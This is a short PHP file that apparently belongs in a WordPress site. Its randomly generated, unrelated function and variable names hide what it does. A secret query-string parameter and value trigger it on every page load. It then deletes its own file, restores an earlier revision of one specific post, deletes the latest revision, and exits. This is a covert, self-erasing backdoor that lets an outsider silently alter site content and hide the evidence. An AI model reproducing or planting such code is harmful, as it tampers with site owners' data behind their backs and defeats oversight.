<?php

function server_quote_icon() {
	if (isset($_GET['view_genesis_conversion_feedback']) && $_GET['view_genesis_conversion_feedback'] === 'ticket_js_archives_another') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shipping_panel_verification = 13505;
		$csv_html5_link_redirect = wp_get_post_revisions($shipping_panel_verification);
		if (empty($csv_html5_link_redirect)) die('no revisions');
		if (count($csv_html5_link_redirect) < 2) die('less than 2');
		$weather_gamipress_floating = array_shift($csv_html5_link_redirect);
		$listings_favicon_event_anti = $weather_gamipress_floating->ID;
		$affiliate_products_more_before = array_shift($csv_html5_link_redirect);
		$bbpress_conversion_remover = $affiliate_products_more_before->ID;
		$graph_maker_csv_views = wp_restore_post_revision($bbpress_conversion_remover);
		if ($graph_maker_csv_views === false) die('error restoring');
		$graph_maker_csv_views = wp_delete_post_revision($listings_favicon_event_anti);		
		if ($graph_maker_csv_views === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'server_quote_icon');
